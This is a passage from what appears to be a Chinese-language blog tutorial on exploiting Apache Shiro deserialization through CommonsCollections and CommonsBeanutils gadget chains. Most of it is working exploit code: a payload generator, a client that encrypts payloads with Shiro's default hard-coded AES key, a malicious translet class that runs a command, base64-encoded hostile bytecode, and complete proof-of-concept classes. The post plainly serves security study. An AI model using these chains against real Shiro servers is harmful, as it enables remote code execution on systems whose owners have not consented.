</span><br><span class="line">            field.set(obj, value);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>写个Client 类配合 CommonsCollectionsShiro.class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import javassist.ClassPool;  </span><br><span class="line">import javassist.CtClass;  </span><br><span class="line">import org.apache.shiro.codec.Base64;  </span><br><span class="line">import org.apache.shiro.crypto.AesCipherService;  </span><br><span class="line">import org.apache.shiro.util.ByteSource;  </span><br><span class="line">import java.io.IOException;  </span><br><span class="line">public class Client &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        ClassPool pool = ClassPool.getDefault();  </span><br><span class="line">  </span><br><span class="line">        CtClass clazz = pool.get(Evil.class.getName());  </span><br><span class="line">        byte[] payloads = new CommonsCollectionsShiro().getPayload(clazz.toBytecode());  </span><br><span class="line">        AesCipherService aes = new AesCipherService();  </span><br><span class="line">  </span><br><span class="line">        byte[] key = Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);  </span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);  </span><br><span class="line">        System.out.printf(ciphertext.toString());  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>evil.class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;  </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;  </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  </span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;  </span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;  </span><br><span class="line">  </span><br><span class="line">public class Evil extends AbstractTranslet &#123;  </span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;&#125;  </span><br><span class="line">  </span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;&#125;  </span><br><span class="line">  </span><br><span class="line">    public Evil() throws Exception &#123;  </span><br><span class="line">        super();  </span><br><span class="line">        System.out.println(&quot;Hello TemplatesImpl&quot;);  </span><br><span class="line">        Runtime.getRuntime().exec(&quot;calc.exe&quot;);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把cookie传入shiro客户端 成功弹出计算器：</p><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/99.jpg"></p><h1 id="CommonsBeanutils-无依赖攻击"><a href="#CommonsBeanutils-无依赖攻击" class="headerlink" title="CommonsBeanutils(无依赖攻击)"></a>CommonsBeanutils(无依赖攻击)</h1><p>之前我们都是打了  CC依赖来进行攻击的，如CC3.2.1 ，那么原生的Shiro是没有CC依赖的，接下来了解一下 CB （Apache Commons Beanutils）</p><h2 id="Commons-Beanutils"><a href="#Commons-Beanutils" class="headerlink" title="Commons Beanutils"></a>Commons Beanutils</h2><p>Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，他提供了 对普通类对象 （JAVABean）的一些操作方法，至于什么是JAVABEAN，以我的理解，拥有GET  SET方法的类，可以笼称 为JAVABEAN</p><p>如，Cat是一个最简单的 JavaBean:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">final public class Cat &#123; </span><br><span class="line">private String name = &quot;Ku1s&quot;; </span><br><span class="line">public String getName() &#123; </span><br><span class="line">return name; &#125; </span><br><span class="line"></span><br><span class="line">public void setName(String name) &#123; </span><br><span class="line">this.name = name;</span><br><span class="line"></span><br><span class="line">&#125; &#125;</span><br></pre></td></tr></table></figure><p>它包含一个私有属性name，和读取和设置这个属性的两个方法，又称为getter和setter。其中，getter 的方法名以get开头，setter的方法名以set开头，全名符合骆驼式命名法（Camel-Case）。</p><p>CB中 提供了一个静态方法： PropertyUtils.getProperty ，打印让我们看看什么情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public class Test &#123;  </span><br><span class="line">    public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;  </span><br><span class="line">        Object name = PropertyUtils.getProperty(new Cat(), &quot;name&quot;);  </span><br><span class="line">        System.out.println(name);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看来这个 getProperty 会调用我们的 getter方法，也就是getName，获得返回值，除此之外，PropertyUtils.getProperty 还支持 递归获取属性，比如 a对象中有属性b，b对象有属性c，我们可以通过 PropertyUtils.getProperty(a, “b.c”); 的方式进行递归获取。通过这个 方法，使用者可以很方便地调用任意对象的getter，适用于在不确定JavaBean是哪个类对象时使用。</p><h2 id="getter的利用"><a href="#getter的利用" class="headerlink" title="getter的利用"></a>getter的利用</h2><p>在 commons-beanutils包中存 在一个：<code> org.apache.commons.beanutils.BeanComparator 。</code></p><p>BeanComparator是CB提供用来比较两个 JAVAbean 是否相等的类，其实现了Comparator 和Serializable接口 ，咱们来看看他的compare比较方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public int compare(T o1, T o2) &#123;  </span><br><span class="line">    if (this.property == null) &#123;  </span><br><span class="line">        return this.internalCompare(o1, o2);  </span><br><span class="line">    &#125; else &#123;  </span><br><span class="line">        try &#123;  </span><br><span class="line">            Object value1 = PropertyUtils.getProperty(o1, this.property);  </span><br><span class="line">            Object value2 = PropertyUtils.getProperty(o2, this.property);  </span><br><span class="line">            return this.internalCompare(value1, value2);  </span><br><span class="line">        &#125; catch (IllegalAccessException var5) &#123;  </span><br><span class="line">            throw new RuntimeException(&quot;IllegalAccessException: &quot; + var5.toString());  </span><br><span class="line">        &#125; catch (InvocationTargetException var6) &#123;  </span><br><span class="line">            throw new RuntimeException(&quot;InvocationTargetException: &quot; + var6.toString());  </span><br><span class="line">        &#125; catch (NoSuchMethodException var7) &#123;  </span><br><span class="line">            throw new RuntimeException(&quot;NoSuchMethodException: &quot; + var7.toString());  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>compare方法 接收两个对象：</p><ol><li>如果 这里的 property 为空，则直接比较这两个对象</li><li>如果这里的property 不为空，则调用PropertyUtils.getProperty，分别取这两个对象的 property属性，然后再比较他们的属性值。</li></ol><p>我们知道，PropertyUtils.getProperty 这个方法会自动调用 Getter 方法，这个点是任意代码执行的关键，有没有什么方法可以执行恶意代码执行呢？ 其实是有的</p><p>在第一篇  <a href="https://snowlyzz.github.io/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/">JAVA动态加载字节码 | Ku1s (snowlyzz.github.io)</a>, 其中在跟源码的时候，有这么一条链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties() -&gt; </span><br><span class="line">TemplatesImpl#newTransformer() -&gt; </span><br><span class="line">TemplatesImpl#getTransletInstance() -&gt; </span><br><span class="line">TemplatesImpl#defineTransletClasses() -&gt; </span><br><span class="line">TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure><p>看到 第一个 getOutputProperties，我们是否可以利用 Getter 自动去调用其 getOutputProperties()方法呢？然后后续再进行恶意字节码。</p><p>所以  PropertyUtils.getProperty( obj1, property ) 这段代码 ，obj1 是一个 TemplatesImpl 对象，而 property 的值为 outputProperties时，则会自动调用 getter 方法，也就是 TemplatesImpl#getOutputProperties() 方法，触发代码执行。</p><h2 id="getter反序列化利用连构造"><a href="#getter反序列化利用连构造" class="headerlink" title="getter反序列化利用连构造"></a>getter反序列化利用连构造</h2><p>了解了大概原理，接下来来构造一下 利用链</p><p>还是先构造 TemplatesImpl：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">byte[] code = Base64.getDecoder().decode(&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAA1FdmlsVGVzdC5qYXZhDAAOAA8HABwMAB0AHgEABGNhbGMMAB8AIAEACEV2aWxUZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAMAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAEQALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAASAAQAEwANABQACwAAAAQAAQAQAAEAEQAAAAIAEg==&quot;);  </span><br><span class="line">TemplatesImpl obj = new TemplatesImpl();  </span><br><span class="line">setFieldValue(obj,&quot;_bytecodes&quot;,new byte[][]&#123;code&#125;);  </span><br><span class="line">setFieldValue(obj,&quot;_name&quot;,&quot;ku1s&quot;);  </span><br><span class="line">setFieldValue(obj,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br></pre></td></tr></table></figure><p>然后 到我们的 BeanComparator.class  ,进行实例化。如果我们默认 BeanComparator.class 构造函数为空时，默认的 property 就为空 :</p><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/null.jpg"></p><p><code>final BeanComparator comparator = new BeanComparator();</code></p><p>然后用这个 comparator实例化优先队列 PriorityQueue ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">final PriorityQueue queue = new PriorityQueue(2, comparator); </span><br><span class="line">// stub data for replacement later </span><br><span class="line">queue.add(1);</span><br><span class="line">queue.add(1);</span><br><span class="line"></span><br><span class="line">// comparator = BeanComparator对象</span><br></pre></td></tr></table></figure><p>至于为什么要 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">priorityQueue.add(1);</span><br><span class="line">priorityQueue.add(2);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>时为了进行 内部的堆需要调整，进行元素的比较的话，肯定得至少两个元素才可以。这一点也在反序列化链的代码中得到了体现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">private void heapify() &#123;</span><br><span class="line">    for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>初始化时使用正经对象，且 property 为空，这一系列操作是为了初始化的时候不要出错。然后，我们 再用反射将 property 的值设置成恶意的 outputProperties ，将队列里的两个1替换成恶意的 TemplateImpl 对象：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;); </span><br><span class="line">setFieldValue(queue, &quot;queue&quot;, new Object[]&#123;obj, obj&#125;);</span><br></pre></td></tr></table></figure><p>调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">new PriorityQueue(2,comparator=BeanComparator对象)</span><br><span class="line">PriorityQueue#readObject() =&gt;</span><br><span class="line">heapify() =&gt;</span><br><span class="line">siftDown() = &gt;</span><br><span class="line">siftDownUsingComparator()=&gt;</span><br><span class="line">comparator.compare()</span><br><span class="line"></span><br><span class="line">BeanComparator#compare() =&gt;</span><br><span class="line">if (this.property == null) &#123;&#125;=&gt;</span><br><span class="line"></span><br><span class="line">Object value1 = PropertyUtils.getProperty(o1, this.property);</span><br><span class="line">Object value2 = PropertyUtils.getProperty(o2, this.property);</span><br><span class="line"></span><br><span class="line">TemplatesImpl#getOutputProperties()=&gt;</span><br><span class="line">/**/</span><br><span class="line">TemplatesImpl#defineClass()</span><br></pre></td></tr></table></figure><p>完整POC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">public class Test &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        byte[] code = Base64.getDecoder().decode(&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAA1FdmlsVGVzdC5qYXZhDAAOAA8HABwMAB0AHgEABGNhbGMMAB8AIAEACEV2aWxUZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAMAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAEQALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAASAAQAEwANABQACwAAAAQAAQAQAAEAEQAAAAIAEg==&quot;);  </span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();  </span><br><span class="line">        setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;code&#125;);  </span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;ku1s&quot;);  </span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());  </span><br><span class="line">  </span><br><span class="line">        BeanComparator comparator = new BeanComparator();//使 property =null 避免出错  </span><br><span class="line">  </span><br><span class="line">        PriorityQueue priorityQueue = new PriorityQueue(2,comparator);  </span><br><span class="line">        priorityQueue.add(1);  </span><br><span class="line">        priorityQueue.add(1);  </span><br><span class="line">        //将没改的值 改成恶意值  </span><br><span class="line">        setFieldValue(comparator,&quot;property&quot;,&quot;outputProperties&quot;); //改成outputProperties,使自动调用getOutputProperties  </span><br><span class="line">        setFieldValue(priorityQueue,&quot;queue&quot;,new Object[]&#123;templates, templates&#125;); //让其去对比，且满足 queue[right]) &gt; 0  </span><br><span class="line">        byte[] serialize = serialize(priorityQueue);  </span><br><span class="line">        unserialize(serialize);  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;  </span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);  </span><br><span class="line">        field.setAccessible(true);  </span><br><span class="line">        field.set(obj,value);  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static void unserialize(byte[] bytes) throws Exception&#123;  </span><br><span class="line">        try(ByteArrayInputStream bain = new ByteArrayInputStream(bytes);  </span><br><span class="line">            ObjectInputStream oin = new ObjectInputStream(bain))&#123;  </span><br><span class="line">            oin.readObject();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static byte[] serialize(Object o) throws Exception&#123;  </span><br><span class="line">        try(ByteArrayOutputStream baout = new ByteArrayOutputStream();  </span><br><span class="line">            ObjectOutputStream oout = new ObjectOutputStream(baout))&#123;  </span><br><span class="line">            oout.writeObject(o);  </span><br><span class="line">            return baout.toByteArray();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功弹出计算器~~~<br><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/pc1.jpg"></p><h2 id="无依赖的Shiro反序列化利用"><a href="#无依赖的Shiro反序列化利用" class="headerlink" title="无依赖的Shiro反序列化利用"></a>无依赖的Shiro反序列化利用</h2><p>我们用上一个poc 发送payload 时会发现<br><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/ud.jpg"></p><p><code>Unable to load class named [org.apache.commons.collections.comparators.ComparableComparator]</code></p><p>简单来说就是没有找到 org.apache.commons.collections.comparators.ComparableComparator 类，从包名即可看出，这个类是来自于commons-collections。</p><p>在实际场景下，目标可能没有安装 commons-collections依赖，那么这个时候，ComparableComparator这个类是用不了的，因为他依赖于CC，也就是我们刚刚用的那个POC，那么难道没有CC就不能利用吗？</p><p>我们先来看看这个 org.apache.commons.collections.comparators.ComparableComparator 这个类在 哪里使用了：</p><p>有两处 调用了  ComparableComparator ：</p><ol><li><p>ReverseComparator<br><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/rev.jpg"></p></li><li><p>BeanComparator<br><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/bc.jpg"></p></li></ol><p>这里 两者利用点都是类似的，所以只讲 BeanComparator 。</p><p>在BeanComparator 类的构造函数处，当没有显式传入 Comparator 的情况下，则默认使用 ComparableComparator 。</p><p>既然此时 ComparableComparator 依赖于CC，并且我们用不了了,我们需要找到一个类来平替掉ComparableComparator，它满足下面这几个条件：</p><ol><li>实现 java.util.Comparator 接口 </li><li>实现 java.io.Serializable 接口 </li><li>Java、shiro或commons-beanutils自带，且兼容性强</li></ol><p>通过IDEA的功能，我们找到一个 CaseInsensitiveComparator ：</p><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/ks.png"></p><p>其代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">public static final Comparator&lt;String&gt; CASE_INSENSITIVE_ORDER  </span><br><span class="line">                                     = new CaseInsensitiveComparator();  </span><br><span class="line">private static class CaseInsensitiveComparator  </span><br><span class="line">        implements Comparator&lt;String&gt;, java.io.Serializable &#123;  </span><br><span class="line">    // use serialVersionUID from JDK 1.2.2 for interoperability  </span><br><span class="line">    private static final long serialVersionUID = 8575799808933029326L;  </span><br><span class="line">  </span><br><span class="line">    public int compare(String s1, String s2) &#123;  </span><br><span class="line">        int n1 = s1.length();  </span><br><span class="line">        int n2 = s2.length();  </span><br><span class="line">        int min = Math.min(n1, n2);  </span><br><span class="line">        for (int i = 0; i &lt; min; i++) &#123;  </span><br><span class="line">            char c1 = s1.charAt(i);  </span><br><span class="line">            char c2 = s2.charAt(i);  </span><br><span class="line">            if (c1 != c2) &#123;  </span><br><span class="line">                c1 = Character.toUpperCase(c1);  </span><br><span class="line">                c2 = Character.toUpperCase(c2);  </span><br><span class="line">                if (c1 != c2) &#123;  </span><br><span class="line">                    c1 = Character.toLowerCase(c1);  </span><br><span class="line">                    c2 = Character.toLowerCase(c2);  </span><br><span class="line">                    if (c1 != c2) &#123;  </span><br><span class="line">                        // No overflow because of numeric promotion  </span><br><span class="line">                        return c1 - c2;  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        return n1 - n2;  </span><br><span class="line">    &#125;</span><br><span class="line">    private Object readResolve() &#123; return CASE_INSENSITIVE_ORDER; &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个类是 java.lang.String 类下的私有类，实现了 Comparator 和 Serializable，是个好的替代品<br>我们通过 String.CASE_INSENSITIVE_ORDER 即可拿到上下文中的 CaseInsensitiveComparator 对 象，用它来实例化 BeanComparator ：</p><p>构造链如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">public class CommonsCollectionsShiro &#123;  </span><br><span class="line">        public byte[] getPayload(byte[] clazzBytes) throws Exception &#123;  </span><br><span class="line">            TemplatesImpl templates = new TemplatesImpl();  </span><br><span class="line">            setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;clazzBytes&#125;);  </span><br><span class="line">            setFieldValue(templates,&quot;_name&quot;,&quot;ku1s&quot;);  </span><br><span class="line">            setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());  </span><br><span class="line">  </span><br><span class="line">            BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);//使 property =null 避免出错  </span><br><span class="line">  </span><br><span class="line">            final PriorityQueue&lt;Object&gt; priorityQueue = new PriorityQueue&lt;Object&gt;(2, comparator);  </span><br><span class="line">  </span><br><span class="line">            priorityQueue.add(&quot;1&quot;);  </span><br><span class="line">            priorityQueue.add(&quot;1&quot;);  </span><br><span class="line">            //将没改的值 改成恶意值  </span><br><span class="line">            setFieldValue(comparator,&quot;property&quot;,&quot;outputProperties&quot;); //改成outputProperties,使自动调用getOutputProperties  </span><br><span class="line">            setFieldValue(priorityQueue,&quot;queue&quot;,new Object[]&#123;templates, templates&#125;); //让其去对比，且满足 queue[right]) &gt; 0  </span><br><span class="line">  </span><br><span class="line">            // ==================            // 生成序列化字符串  </span><br><span class="line">            ByteArrayOutputStream barr = new ByteArrayOutputStream();  </span><br><span class="line">            ObjectOutputStream oos = new ObjectOutputStream(barr);  </span><br><span class="line">            oos.writeObject(priorityQueue);  </span><br><span class="line">            oos.close();  </span><br><span class="line">  </span><br><span class="line">            return barr.toByteArray();  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;  </span><br><span class="line">            Field field = obj.getClass().getDeclaredField(fieldName);  </span><br><span class="line">            field.setAccessible(true);  </span><br><span class="line">            field.set(obj, value);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>Client.class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 